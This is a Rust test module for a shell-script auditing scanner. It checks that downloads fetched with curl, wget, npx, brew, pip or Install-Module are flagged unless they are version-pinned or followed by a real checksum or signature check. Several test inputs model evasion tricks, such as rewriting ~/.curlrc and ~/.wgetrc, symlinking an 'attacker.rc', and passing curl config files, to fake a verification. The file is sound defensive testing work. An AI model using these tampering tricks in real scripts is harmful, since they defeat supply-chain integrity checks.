            "curl -o key.asc https://example.com/v1.2.3/key.asc\ngpg --import key.asc\ncurl -o tool https://example.com/tool\necho 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  tool' | sha256sum -c - && gpg --verify unrelated.sig unrelated",
            "test.sh",
            1,
            "",
            &mut mixed,
            &DEFAULT_CONFIG,
        );
        assert!(mixed.findings.is_empty());
        assert!(
            mixed
                .allowed
                .iter()
                .any(|allowed| allowed.reason == "followed by checksum verification")
        );

        let mut piped = AuditCollector::new(true);
        scan_shell_content(
            "curl -o key.asc https://example.com/v1.2.3/key.asc\ngpg --import key.asc\ncurl -o tool https://example.com/tool\necho 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  tool' | sha256sum -c - | gpg --verify unrelated.sig unrelated",
            "test.sh",
            1,
            "",
            &mut piped,
            &DEFAULT_CONFIG,
        );
        assert!(
            piped
                .findings
                .iter()
                .any(|finding| finding.pattern_matched.contains("curl -o tool"))
        );
    }

    #[test]
    fn shell_scan_qualified_fetchers_and_wget_prefix_taint_signatures() {
        for (signature_fetch, signature) in [
            (
                "/usr/bin/curl -o tool.sig https://example.com/v1.2.3/tool.sig",
                "tool.sig",
            ),
            (
                "/usr/bin/wget -P downloads https://example.com/v1.2.3/tool.sig",
                "downloads/tool.sig",
            ),
        ] {
            let mut c = AuditCollector::new(true);
            scan_shell_content(
                &format!(
                    "curl -o tool https://example.com/tool\n{signature_fetch}\ngpg --verify {signature} tool"
                ),
                "test.sh",
                1,
                "",
                &mut c,
                &DEFAULT_CONFIG,
            );
            assert!(
                c.findings
                    .iter()
                    .any(|finding| finding.pattern_matched.contains("curl -o tool")),
                "signature fetch: {signature_fetch}"
            );
        }
    }

    #[test]
    fn shell_scan_variable_curl_signature_output_does_not_suppress_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool https://example.com/tool\ncurl -o \"$SIG\" https://example.com/v1.2.3/tool.sig\ngpg --verify tool.sig tool",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(
            c.allowed
                .iter()
                .all(|allowed| allowed.reason != "followed by checksum verification")
        );
    }

    #[test]
    fn shell_scan_variable_curl_remote_name_does_not_suppress_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool https://example.com/tool\ncurl -O \"$SIG_URL\"\ngpg --verify tool.sig tool",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(!c.findings.is_empty());
        assert!(
            c.allowed
                .iter()
                .all(|allowed| allowed.reason != "followed by checksum verification")
        );
    }

    #[test]
    fn shell_scan_bare_wget_signature_does_not_suppress_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool https://example.com/tool\nwget https://example.com/v1.2.3/tool.sig\ngpg --verify tool.sig tool",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(
            c.allowed
                .iter()
                .all(|allowed| allowed.reason != "followed by checksum verification")
        );
    }

    #[test]
    fn shell_scan_prior_wgetrc_mutation_taints_later_output() {
        for assignment in [
            "export WGETRC=./wgetrc",
            "export WGETRC+=./wgetrc",
            "name=WGETRC; export \"$name=./wgetrc\"",
            "name=WGETRC; declare -x \"$name=./wgetrc\"",
            "name=WGETRC; printf -v \"$name\" ./wgetrc; export \"$name\"",
        ] {
            let mut c = AuditCollector::new(true);
            let content = format!(
                "curl -o tool https://example.com/tool\n{assignment}\nwget https://example.com/v1.2.3/TOOL.SIG\ngpg --verify tool.sig tool"
            );
            scan_shell_content(&content, "test.sh", 1, "", &mut c, &DEFAULT_CONFIG);
            assert_eq!(c.findings.len(), 1, "assignment: {assignment}");
            assert!(
                c.allowed
                    .iter()
                    .all(|allowed| allowed.reason != "followed by checksum verification"),
                "assignment: {assignment}"
            );
        }
    }

    #[test]
    fn shell_scan_rc_file_mutation_taints_later_fetch_output() {
        for (mutation, signature_fetch) in [
            (
                r#"echo "output_document = bin.sig" >> ~/.wgetrc"#,
                "wget https://example.com/v1.2.3/unrelated",
            ),
            (
                r#"echo "output = bin.sig" >> ~/.curlrc"#,
                "curl https://example.com/v1.2.3/unrelated",
            ),
            (
                "touch ~/.netrc",
                "curl https://example.com/v1.2.3/unrelated",
            ),
            (
                "ln -sf attacker.rc ~/.curlrc",
                "curl https://example.com/v1.2.3/unrelated",
            ),
        ] {
            let mut c = AuditCollector::new(true);
            let content = format!(
                "curl -o bin https://example.com/bin\n{mutation}\n{signature_fetch}\ngpg --verify bin.sig bin"
            );
            scan_shell_content(&content, "test.sh", 1, "", &mut c, &DEFAULT_CONFIG);
            assert_eq!(c.findings.len(), 1, "mutation: {mutation}");
            assert!(
                c.findings[0].pattern_matched.contains("curl -o bin"),
                "mutation: {mutation}"
            );
            assert!(
                c.allowed
                    .iter()
                    .all(|allowed| allowed.reason != "followed by checksum verification"),
                "mutation: {mutation}"
            );
        }
    }

    #[test]
    fn shell_scan_curl_config_option_taints_fetch_output() {
        for signature_fetch in [
            "curl -K ./curl.conf https://example.com/v1.2.3/unrelated",
            "curl --config=./curl.conf https://example.com/v1.2.3/unrelated",
        ] {
            let mut c = AuditCollector::new(true);
            let content = format!(
                "curl -o bin https://example.com/bin\n{signature_fetch}\ngpg --verify bin.sig bin"
            );
            scan_shell_content(&content, "test.sh", 1, "", &mut c, &DEFAULT_CONFIG);
            assert_eq!(c.findings.len(), 1, "fetch: {signature_fetch}");
            assert!(c.findings[0].pattern_matched.contains("curl -o bin"));
            assert!(
                c.allowed
                    .iter()
                    .all(|allowed| allowed.reason != "followed by checksum verification"),
                "fetch: {signature_fetch}"
            );
        }
    }

    #[test]
    fn shell_scan_later_unknown_output_does_not_invalidate_completed_verification() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o bin https://example.com/bin\ngpg --verify committed.sig bin\ncurl -K ./curl.conf https://example.com/v1.2.3/unrelated",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(
            c.allowed
                .iter()
                .any(|allowed| allowed.reason == "followed by checksum verification")
        );
    }

    #[test]
    fn shell_scan_continuation_with_downloaded_sidecar_not_suppressed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L \\\n  https://example.com/tool -o tool\nsha256sum -c tool.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_checksum_command_variants_suppress_fetch() {
        for checksum in [
            "openssl dgst -sha256 -verify public.pem -signature tool.sig tool",
            "gpg --verify tool.sig tool",
            "if ((Get-FileHash tool).Hash -ne 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') { throw 'checksum mismatch' }",
        ] {
            let mut c = AuditCollector::new(true);
            let content = format!("curl -o tool https://example.com/tool\n{checksum}");
            scan_shell_content(&content, "test.sh", 1, "", &mut c, &DEFAULT_CONFIG);
            assert!(c.findings.is_empty(), "{checksum}");
            assert_eq!(c.allowed.len(), 1, "{checksum}");
            assert_eq!(
                c.allowed[0].reason, "followed by checksum verification",
                "{checksum}"
            );
        }

        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool https://example.com/tool\nsha256sum -c tool.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_get_file_hash_rejects_runtime_expected_digest() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool https://example.com/tool\nif ((Get-FileHash tool).Hash -ne $EXPECTED) { throw 'checksum mismatch' }",
            "test.ps1",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_unrelated_checksum_does_not_suppress_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool.sh https://example.com/install.sh\nsha256sum unrelated.txt",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_checksum_calculation_does_not_suppress_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool.sh https://example.com/install.sh\nsha256sum tool.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_generic_checksum_manifest_does_not_suppress_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool.tgz https://example.com/tool.tgz\nsha256sum -c SHA256SUMS",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_checksum_must_verify_every_fetch_target() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool https://example.com/tool && wget -O helper https://example.com/helper\nsha256sum tool",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_script_arg_cmd_sub_not_a_pipe_finding() {
        // Fetched bytes passed as a script argument are not executed — this
        // used to fire the high-severity command-substitution rule via the
        // `sh` in the filename. The data-format URL keeps the unversioned
        // rule quiet too, so the line is fully clean.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            r#"./notify.sh "$(curl -s https://api.example.com/status.json)""#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
    }

    #[test]
    fn shell_scan_versioned_url_at_end_of_line_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -LO https://example.com/download/v1.2.3",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn shell_scan_curl_latest_at_end_of_line_is_high() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -LO https://example.com/releases/latest",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_npx_unversioned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "npx create-react-app my-app",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("npx"));
    }

    #[test]
    fn shell_scan_npx_version_pinned_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "npx typescript@5.6.0",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_brew_head_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "brew install ffmpeg --HEAD",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("--HEAD"));
    }

    #[test]
    fn shell_scan_brew_install_without_head_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "brew install ffmpeg",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_ps_install_module_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "Install-Module -Name Pester -Force",
            "test.ps1",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
    }

    #[test]
    fn shell_scan_ps_install_module_required_version_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "Install-Module -Name Pester -RequiredVersion 5.3.1 -Force",
            "test.ps1",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_pip_git_url_unversioned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pip install git+https://github.com/owner/repo.git",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("git+URL"));
    }

    #[test]
    fn shell_scan_pip_git_url_with_ref_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pip install git+https://github.com/owner/repo.git@v1.2.3",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_pip_git_url_branch_ref_is_finding() {
        // `@main` tracks the branch HEAD — not a pin, so it must still fire.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pip install git+https://github.com/owner/repo.git@main",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("git+URL"));
    }
}
